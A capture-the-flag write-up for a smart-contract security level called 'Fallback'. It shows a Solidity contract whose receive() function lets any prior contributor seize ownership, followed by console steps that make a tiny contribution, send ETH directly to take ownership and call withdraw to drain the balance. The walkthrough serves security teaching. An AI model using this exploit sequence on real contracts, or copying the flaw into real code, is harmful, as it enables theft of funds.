# Fallback

Second Challenge description is as follows:

Look carefully at the contract's code below.
You will beat this level if:

1. you claim ownership of the contract
2. you reduce its balance to 0
  
Things that might help:

- How to send ether when interacting with an ABI
- How to send ether outside of the ABI
- Converting to and from wei/ether units (see help() command)
- Fallback methods

Code:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

### Resolution
Ok, so our goal here is to claim ownership of this contract and drain all the money in it.
From the help given we can see that sending ether through a web3 api would be useful and also having an understanding of the fallback methods in a contract.

In the contract we can see that there is an 'official' way of claiming ownership which is trough the `contribute()` function, but unless you have more than 1000 eth is not viable option.

We can also see that there's a `receive()` function that could potentially allow us to claim the ownership! But, when does this `receive()` method executes? Here's where  the fallback methods part comes into place.

When se send a ETH to a contract, if the contract has a declared `receive()` method, then this method will execute and process the "receiving" of the ETH that we sent.

So, with this information, we could try the following strategy:

1. Contribute to the contract via `contribute()` with a minimum amount of ETH so we are registered as contributors
2. Send some ETH through the ABI of the contract so the `receive()` method can be executed and set us as new owners
3. Execute withdraw as the new owner and drain the contract.

Let's see!
### Steps
In the Console:
1. First, we contribute to the contract a minimum to be registered as contributor and pass the `require` statement on `contribute()`:
```
await contract.contribute({ value: toWei('0.0001') })

// Check your contribution with:
fromWei(await contract.getContribution())
```
2. Second we can take the contract address with: `await contract.address` or just use it in the next step
3. Once you have the contract address we can send ETH to that address via the given API:
```
await sendTransaction({from:"{YOUR_CONNECTED_WALLET_ADDRESS}", to: contract.address, value: toWei("0.002")})
```
3. The above TX will go through the `receive()` method making us the new owner
4. Check the new owner (should be your address):
````
contract.owner
````
5. Execute the `withdraw` function:
```
await contract.withdraw()
````

That's it! These steps should be enough to claim ownership and drain the contract! 💥 
## License

[MIT](https://choosealicense.com/licenses/mit/)